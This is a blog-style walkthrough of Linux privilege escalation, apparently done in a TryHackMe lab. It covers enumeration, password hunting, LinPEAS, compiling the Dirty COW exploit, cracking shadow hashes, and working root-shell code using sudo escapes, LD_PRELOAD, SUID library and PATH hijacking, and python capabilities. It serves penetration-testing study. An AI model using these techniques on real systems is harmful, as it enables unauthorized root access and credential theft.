---
title: "Linux Privilege Escalation"
date: 2024-08-17 10:00:00 +0800
categories: [Linux, Security]
tags: [Privilege Escalation, Linux]
excerpt: "A detailed write-up on Linux privilege escalation techniques covered in the Privilege Escalation in Linux."
---
# Linux Privilege Escalation
![image.png](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWOckg_ZAWFp4fiDeOwmZnqDQ-JslUjqfXuw&s)
# **Introduction to the Privilege Escalation Course for Linux**

The Privilege Escalation for Linux is designed to equip cybersecurity enthusiasts with the skills and knowledge needed to elevate their access on Linux systems. Throughout this course, you will delve into various privilege escalation techniques, from exploiting misconfigurations to leveraging kernel vulnerabilities.

By the end of this blog, you will have a deep understanding of how to identify and exploit weaknesses in Linux systems, making you proficient in the art of privilege escalation. This course is ideal for those looking to enhance their penetration testing skills or seeking to fortify their defenses against unauthorized access in Linux environments.
# System Enumeration :-

First thing i use this command   `hostname`   to display  the system's hostname. The hostname is a unique name assigned to a computer on a network, which helps identify it among other devices.

Second i use command `uname -a`  to display detailed information about the system's kernel and operating system i check if system have kernal exploit .

- Some command be useful to know version
    
    `cat /proc/version` 
    
    `lscpu` 
    
    `ps aux | grep root`
   
# User Enumeration :-

First we should know what is this user we write `whoami`  to display username and write `id` 

to know more info about user .

Second i want know user privilege we use `sudo -l`  we will see what user can access .

Third we check important files in system like `/etc/passwd`  and  `/etc/group` and `/etc/shadow` 

you can search about this files 

- some command be useful to see content in this files
    
    `cat /etc/passwd | cut -d : -f 1` 
    
    `cat /etc/shadow| cut -d : -f 2`
    

# Network Enumeration :-

### First Basic Network Information

View Network Interfaces and IP Addresses by this command `ifconfig` and `ip -a`

View Routing Table by this command `route -n` and `ip rout`

### Second Network Scanning and Enumeration

List Open Ports on the Local Machine by this command `netstat -tuln` and `ss -tuln` 

### Network Traffic and Connection Monitoring

Monitor Active Network Connections by this command  `netstat -antup` 

display detailed network connection information on a system, including the process IDs (PIDs) associated with each connection `netstat -ano`

View Traffic on a Specific Port by this command `tcpdump -i eth0 port 80`

### Network and Host Discovery

Discover Live Hosts on the Network  by this command `arp-scan -l` 

Ping Sweep (Check Live Hosts in a Subnet) by this bash script 

```bash
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "64 bytes"; done
```

### Service and Process Enumeration

List Running Services and Open Ports by this command  ****`lsof -i -P -n` 

Check Which Process is Using a Specific Port by this command `lsof -i :80` 

Display Listening Sockets by this command `ss -lnp` 

# Password Hunting :-

You just search about any password and search about **id_ras** you should crowl in system

- we can use this commands to search
    
    `grep --color=auto -rnw '/' -ie "PASS=" --color=always 2> /dev/null`
    
    `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
    
    `grep --color=auto -rnw '/' -ie "pass" --color=always 2> /dev/null`
# Exploring Automated Tools

## **LinPEAS**

### **Overview**

LinPEAS (Linux Privilege Escalation Awesome Script) is a script that automates the process of finding potential privilege escalation paths on Linux and Unix-like systems. It performs a thorough enumeration of the system, looking for misconfigurations, vulnerable software, sensitive files, and other factors that could allow a lower-privileged user to escalate their privileges to root.

### **Key Features**

- **System Information**: Collects basic information about the system, such as the kernel version, architecture, and running services.
- **Environment Enumeration**: Checks for environment variables, paths, and sudo privileges that could be exploited.
- **File and Directory Permissions**: Identifies misconfigured file permissions, such as world-writable files, SUID/SGID binaries, and writable directories in the `$PATH`.
- **Service and Process Enumeration**: Lists running services and processes, checking for vulnerabilities or misconfigurations.
- **Credentials and Sensitive Information**: Looks for passwords, SSH keys, and other sensitive data stored on the filesystem.
- **Kernel Exploit Checks**: Identifies if the system is vulnerable to known kernel exploits based on the kernel version.
- **Docker and Virtualization Checks**: Detects if the system is running in a containerized environment or virtual machine and looks for escape techniques.

### **How to Use LinPEAS**

1. **Download LinPEAS**:
    
    ```bash
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
    chmod +x linpeas.sh
    ```
    
2. **Run LinPEAS**:
Simply execute the script on the target machine:
    
    ```bash
    ./linpeas.sh
    ```
    
    For more detailed output, use the following:
    
    ```bash
    ./linpeas.sh -a
    ```
    
3. **Interpreting the Output**:
The output is color-coded:
    - **Red**: Indicates potential privilege escalation vectors.
    - **Yellow**: Highlights important findings that may be useful.
    - **Green**: General information.

### **Example of What LinPEAS Looks For**

- **SUID/GUID Binaries**: Finds binaries that can be executed with elevated privileges.
- **Writable Directories in PATH**: Detects writable directories in the user's `PATH`, which could be exploited by placing malicious binaries.
- **SSH Keys**: Searches for SSH keys that might allow further access.
- **Kernel Exploits**: Checks if the kernel is vulnerable to public exploits.

### **Advantages**

- **Comprehensive**: LinPEAS covers a wide range of checks, providing an all-in-one solution for Linux privilege escalation enumeration.
- **Automated**: Reduces the need for manual checks, saving time during an engagement.
- **Color-Coded Output**: Makes it easier to quickly identify important information.

### **Limitations**

- **Verbose Output**: The amount of information can be overwhelming; understanding which parts are relevant requires some experience.
- **Requires Execution on Target**: LinPEAS must be executed on the target system, which might be detected by security tools.

———————————————————————————————————————————

## **Linux-Exploit-Suggester**

### **Overview**

Linux-Exploit-Suggester is a tool that checks the kernel version of a Linux system and suggests possible kernel exploits that could be used to escalate privileges. This tool is useful for identifying known vulnerabilities that can be exploited on systems running outdated or vulnerable kernels.

### **Key Features**

- **Kernel Exploit Suggestions**: Based on the kernel version, it suggests publicly available exploits that might be used to gain root access.
- **Exploit Metadata**: Provides a brief description of each suggested exploit, including the kernel versions it targets and the potential impact.
- **Easy to Use**: Simple command-line interface that requires minimal setup.

### **How to Use Linux-Exploit-Suggester**

1. **Download Linux-Exploit-Suggester**:
There are two versions: `Linux_Exploit_Suggester.sh` and `Linux_Exploit_Suggester2.pl`. The former is more basic, while the latter is more comprehensive.
    
    ```bash
    wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/Linux_Exploit_Suggester.sh
    chmod +x Linux_Exploit_Suggester.sh
    ```
    
    Alternatively, for the Perl version:
    
    ```bash
    wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
    chmod +x linux-exploit-suggester-2.pl
    ```
    
2. **Run Linux-Exploit-Suggester**:
For the shell version:
    
    ```bash
    ./Linux_Exploit_Suggester.sh
    ```
    
    For the Perl version:
    
    ```bash
    ./linux-exploit-suggester-2.pl
    ```
    
3. **Interpreting the Output**:
The output will list potential kernel exploits along with:
    - **CVE Numbers**: References to known vulnerabilities.
    - **Description**: A brief description of what the exploit does.
    - **Kernel Versions**: Specifies the range of kernel versions that are vulnerable to each exploit.
    - **Link**: Provides a link to the exploit's code or detailed information.

### **Example of What Linux-Exploit-Suggester Looks For**

- **Dirty COW** (CVE-2016-5195): A race condition in the memory management system.
- **OverlayFS Privilege Escalation** (CVE-2015-1328): Exploit related to the OverlayFS filesystem.
- **Stack Clash** (CVE-2017-1000364): Exploit related to stack memory management.

### **Advantages**

- **Quick Identification**: Rapidly identifies potential kernel vulnerabilities that can be exploited.
- **Comprehensive Database**: Leverages a wide range of known exploits, especially in the Perl version.
- **Simple Interface**: Easy to use even for those with limited experience.

### **Limitations**

- **Focuses Only on Kernel Exploits**: It doesn't check for other types of privilege escalation vectors, such as misconfigurations or weak file permissions.
- **Requires Internet Connection**: To download and sometimes to fetch the latest updates or details on specific exploits.
- **Outdated Kernels**: The effectiveness depends on the presence of outdated or vulnerable kernels.

---

### **Comparison Between LinPEAS and Linux-Exploit-Suggester**

| Feature | **LinPEAS** | **Linux-Exploit-Suggester** |
| --- | --- | --- |
| **Focus** | Comprehensive system enumeration | Kernel exploit identification |
| **Output** | Detailed, color-coded, and extensive | Focused, concise, based on kernel version |
| **Ease of Use** | Requires some experience to interpret fully | Simple to run and understand |
| **Coverage** | Broad, including files, processes, and more | Narrow, focusing on kernel vulnerabilities |
| **Updates** | Frequently updated with new checks | Database depends on version, sometimes outdated |
| **Recommended For** | General Linux privilege escalation tasks | Quickly finding kernel-specific exploits |


# Kernel Exploits


# What is the Kernal ?

The **kernel** is a [computer program](https://en.wikipedia.org/wiki/Computer_program) at the core of a [computer](https://en.wikipedia.org/wiki/Computer)'s [operating system](https://en.wikipedia.org/wiki/Operating_system) and generally has complete control over everything in the system. The kernel is also responsible for preventing and mitigating conflicts between different processes.[[1]](https://en.wikipedia.org/wiki/Kernel_(operating_system)#cite_note-Linfo-1) It is the portion of the operating system code that is always resident in [memory](https://en.wikipedia.org/wiki/Computer_memory)[[2]](https://en.wikipedia.org/wiki/Kernel_(operating_system)#cite_note-2) and facilitates interactions between hardware and software components.

First we look for version in kernal by this command `uname -a`  

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-12 191101.png)

we will search about this kernal to find exploit :

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-12 191221.png)

we found exploit for our version 

[Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

we download and make exploit ready for run 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-12 191440.png)

we see this file we should write this command to make it ready to run  `gcc -pthread c0w.c -o c0w`

now it we make new file can run to  make exploit  

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-12 191743.png)

we now do this command  `./c0w` 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-12 192019.png)

we have hint in THM if we write `passwd`  after exploit we become root


# Passwords & File Permissions

# scalation via Stored Passwords :-

We look for any password in system and try to login as root

we search in all files we write this command  `ls -las` 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 010403.png)

we look at `.irssi` we found this 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 011011.png)

and we have another thing to myvpn.ovpn

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 012341.png)

and another way we write command `history`

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 012549.png)

we found mysql user & pass 

# Escalation via Weak File Permissions :-

We look at `/etc/passwd`  and `/etc/shadow` 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 014151.png)

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 014230.png)

we put the all result individual and writ this command `unshadow passwd shadow`  and take the result to another file and crack it by john write this command 

`john —wordlist=/usr/share/wordlist/rockyou.txt  result.txt`

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 015005.png)

# Escalation via SSH Keys :-

We search about some files we use this commands : 

**`find / -name authorized_keys 2> /dev/null`**

**`find / -name id_rsa 2> /dev/null`**

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 021238.png)

1. In command prompt type: `chmod 400 id_rsa`

2. In command prompt type: **`ssh -i id_rsa root@<ip>`**


# Sudo

# Escalation via Sudo Shell Escaping :-

We write `sudo -l` and show results : 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 043359.png)

we can use this website to git PrivEsc  https://gtfobins.github.io/ we will see in /usr/bin/vim

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 043734.png)

we use the first command `sudo vim -c ':!/bin/sh'`  

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 043919.png)

we can try with another commands but we will see another thing

# Escalation via LD_PRELOAD :-

If we see `env_keep+=LD_PRELOAD`

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 050313.png)

### What is `LD_PRELOAD`?

`LD_PRELOAD` is an environment variable used in Unix-like operating systems that allows you to specify a shared library (.so file) to be loaded before any other shared libraries when a program is executed. This can be used to override functions in standard libraries, effectively allowing you to inject custom code into a running process.

### What is `env_keep+=LD_PRELOAD`?

In the context of `sudo`, `env_keep+=LD_PRELOAD` is a directive that can be added to the `sudoers` file to allow the `LD_PRELOAD` environment variable to be preserved when running commands with `sudo`. Normally, `sudo` sanitizes the environment to prevent misuse of environment variables like `LD_PRELOAD`, which could be used to hijack or modify the behavior of privileged programs.

### How to Use `LD_PRELOAD` for Privilege Escalation

If you have access to modify the `sudoers` file or if `env_keep+=LD_PRELOAD` is already configured, you can exploit this to escalate privileges.

we write C code make privlage escalation

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

and run this command  `gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles`

and final command **`sudo LD_PRELOAD=/tmp/x.so apache2`** 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 050921.png)

You should check sudo version by this command `sudo -v`  and search about any exploit

# SUID

**SUID (Set User ID)** is a special permission in Unix/Linux systems that allows a user to run an executable file with the permissions of the file owner, rather than with the permissions of the user who runs it. This can be particularly useful, but also potentially dangerous, in the context of privilege escalation.

### **How SUID Works**

- When an executable file has the SUID bit set, it runs with the privileges of the file's owner rather than the privileges of the user executing it.
- For example, if a binary file owned by the `root` user has the SUID bit set, any user who executes that file will temporarily gain `root` privileges while the file is running.

### **Identifying SUID Files**

You can identify SUID files on a system using the `find` command:

```bash
 find / -type f -perm -04000 -ls 2>/dev/null
```

- `perm -4000`: Finds files with the SUID bit set.
- `2>/dev/null`: Suppresses error messages about directories you don’t have permission to search.

### **Privilege Escalation Using SUID**

In the context of privilege escalation, attackers often look for SUID binaries that can be exploited to gain higher privileges. Here’s how this could happen:

1. **Misconfigured SUID Binaries**: If a SUID binary is poorly configured or has vulnerabilities (e.g., buffer overflows, path traversal), an attacker could exploit it to execute arbitrary code with elevated privileges.
2. **Custom Scripts or Binaries**: If a custom script or binary with the SUID bit set is available, and it doesn't properly sanitize inputs or has some other flaw, an attacker could exploit this to execute commands as the file owner.
3. **Exploiting Common Binaries**: Some common binaries, if configured with SUID, can be used by attackers to spawn shells or run commands as `root`. For example:
    - **`/bin/bash`**: If the `bash` binary is set with the SUID bit and owned by `root`, executing it could give a root shell.
    - **`/usr/bin/vim`**: If `vim` has SUID set, an attacker could use it to open a shell with root privileges using `:!sh`.

### **Example of SUID Exploitation**

Let's assume there is a SUID binary `/usr/local/bin/suid_binary` owned by `root`:

```bash
ls -l /usr/local/bin/suid_binary
-rwsr-xr-x 1 root root 12345 Jan 1 12:34 /usr/local/bin/suid_binary
```

The `s` in the file permissions (`rwsr-xr-x`) indicates that the SUID bit is set.

If this binary has a vulnerability, such as allowing the user to execute shell commands without dropping root privileges, an attacker could exploit it as follows:

```bash
/usr/local/bin/suid_binary
```

If exploited, the attacker might be able to execute:

```bash
sh
```

and gain a root shell.

### **Defending Against SUID Exploitation**

- **Minimize SUID Binaries**: Reduce the number of SUID binaries on the system to only what is necessary.
- **Regular Audits**: Regularly audit SUID binaries to ensure that they are secure and necessary.
- **Proper Permissions**: Ensure that custom scripts or binaries with SUID are properly secured and do not allow unintended command execution.

SUID can be very powerful and useful for legitimate administrative tasks, but it can also be a significant security risk if not properly managed. Understanding how SUID works and how it can be exploited is crucial for both defending against privilege escalation attacks and for penetration testing purposes.

## Examples :-

In the first do this command **`find / -type f -perm -04000 -ls 2>/dev/null`  and see results :-**

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 155818.png)

We found interesting files `/usr/local/bin/suid-so`  `usr/local/bin/suid-env`  

`usr/local/bin/suid-env2` 

we will take action in this files  `/usr/local/bin/suid-so` we do this command 

**`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`** 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 160648.png)

we found this from output **`/home/user/.config/libcalc.so` we should make directory and show flowing steps `mkdir /home/user/.config` and create file `libclac.c`** 

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

and flow steps to run this file you should run this command to make file execute

**`gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`**

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 161635.png)

we got root :)

### Second file `usr/local/bin/suid-env`

let how can use this we will cat this file but we didn’t under stand any thing

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 164717.png)

we will use this command **`strings /usr/local/bin/suid-env`** 

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 164819.png)

okay from the output we found this `service apache2 start`

we do simple script give us root access 

**`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`**

and flow steps to run this file you should run this command to make file execute

**`gcc /tmp/service.c -o /tmp/service`** 

and add this to PATH 

**`export PATH=/tmp:$PATH`**

to git root access 

**`/usr/local/bin/suid-env`**

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 171057.png)

we got root :)

### Third file `usr/local/bin/suid-env2`

we do same thing from second file and run this command `strings **/usr/local/bin/suid-env2**`

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 172310.png)

we found this `/usr/sbin/service apache2 start` 

we will do give us root access 

**`function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`**

The function you've provided is a shell function that, when executed, could be used to escalate privileges by leveraging the `SUID` (Set User ID) bit. Let's break down the function step by step:

### **Function Definition:**

```bash
bashCopy code
/usr/sbin/service() {
  cp /bin/bash /tmp &&
  chmod +s /tmp/bash &&
  /tmp/bash -p;
}
```

This defines a shell function named `service`, which performs the following actions:

### **1. `cp /bin/bash /tmp`:**

- **`cp`**: This command copies files.
- **`/bin/bash`**: This is the full path to the Bash shell binary, which is a commonly used command-line shell in Unix/Linux.
- **`/tmp`**: This is a temporary directory, writable by all users, often used for storing temporary files.
    
    **Action:** The function copies the `bash` binary to the `/tmp` directory. This creates a new `bash` executable at `/tmp/bash`.
    

### **2. `chmod +s /tmp/bash`:**

- **`chmod`**: This command changes the permissions of a file.
- **`+s`**: This flag sets the SUID (Set User ID) bit on the specified file.
    
    **Action:** The `chmod +s` command sets the SUID bit on the `/tmp/bash` binary. When a binary with the SUID bit set is executed, it runs with the privileges of the file's owner, rather than the user who launched it. Since the original `bash` binary is owned by `root`, this new `/tmp/bash` will also run with `root` privileges when executed by any user.
    

### **3. `/tmp/bash -p`:**

- **`/tmp/bash`**: This is the copied Bash shell now residing in `/tmp`.
- **`p`**: This option tells `bash` to start without dropping privileges. Normally, when a SUID program runs, it may drop privileges for safety reasons. The `p` option prevents `bash` from doing this, maintaining the elevated privileges.
    
    **Action:** The function then executes the `/tmp/bash` shell with the `-p` flag, which starts a new shell session with root privileges without dropping them.
    

and run this command **`export -f /usr/sbin/service`**

### **What Does `export -f /usr/sbin/service` Do?**

- **Assumes the Function Exists:** Before running `export -f /usr/sbin/service`, the `/usr/sbin/service` function must already be defined in the current shell session. For example, the function we discussed earlier that copies `bash`, sets the SUID bit, and then launches a root shell.
- **Exports the Function:** `export -f /usr/sbin/service` makes the `/usr/sbin/service` function available in any subshell or child process that is spawned from the current shell.

### **Why Export the Function?**

- **Persistence Across Commands:** If you're running a series of commands or scripts that will create new subshells, exporting the function ensures that it remains available for use in these new environments.
- **Privilege Escalation in Scripts:** If the `service` function was defined to perform a privilege escalation task, exporting it allows you to invoke this function within any child process or script without redefining it. This could be particularly useful in a complex exploit scenario where multiple scripts or subshells are involved.

and go to root shell by this command **`/usr/local/bin/suid-env2`**

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 174025.png)

we got root :)

# Capabilities

### **What Are Capabilities in Linux?**

In Linux, **capabilities** are a fine-grained way of assigning specific privileges to processes. Traditionally, root (user ID 0) had all the powers on a system, while non-root users had very limited privileges. Capabilities allow splitting up the superuser's privileges into distinct units, which can be independently enabled or disabled for processes.

### **How Capabilities Work:**

- **Capabilities Are Attributes**: Instead of giving a process or binary full root privileges, you can assign it one or more capabilities, which allow it to perform specific privileged operations without requiring full root access.
- **Capability Sets**: Each process in Linux has three sets of capabilities:
    1. **Permitted Set**: Defines the capabilities that the process may assume.
    2. **Inheritable Set**: Defines the capabilities that can be passed on to child processes.
    3. **Effective Set**: Defines the capabilities that are actually in effect at any given moment.
- **File Capabilities**: Executable files can also be assigned capabilities, allowing any process that runs them to inherit those specific capabilities.

### **Common Capabilities:**

- **CAP_NET_ADMIN**: Allows network-related operations, such as configuring interfaces.
- **CAP_SYS_ADMIN**: A powerful capability that allows various system administration tasks.
- **CAP_SETUID**: Allows setting arbitrary user IDs (UIDs).
- **CAP_SYS_PTRACE**: Allows tracing any process, similar to `strace` or `gdb`.

### **How to Manage and Check Capabilities:**

### **Viewing Capabilities:**

- **List Capabilities of a File:**Example:Output might show:This means the `ping` command has the `CAP_NET_RAW` capability enabled.
    
    ```bash
    getcap /path/to/binary
    ```
    
    ```bash
    getcap /bin/ping
    ```
    
    ```bash
    /bin/ping = cap_net_raw+ep
    ```
    

### **Assigning Capabilities:**

- **Set Capabilities on a File:**
    
    ```bash
    sudo setcap cap_net_raw+ep /path/to/binary
    ```
    
    This command assigns the `CAP_NET_RAW` capability to the specified binary.
    
- **Remove Capabilities:**
    
    ```bash
    sudo setcap -r /path/to/binary
    ```
    
    This removes all capabilities from the specified binary.
    

### Explain It in Privilege Escalation :-

we will search about Capabilities **`getcap -r / 2>/dev/null`**

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 175517.png)

in this case will search in this website https://gtfobins.github.io/

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 175631.png)

`./python -c 'import os; os.setuid(0); os.system("/bin/sh")'`

we will used this command but not all because the python not run in this directory 

`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/sh")’`

![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 180100.png)

finally we got root :)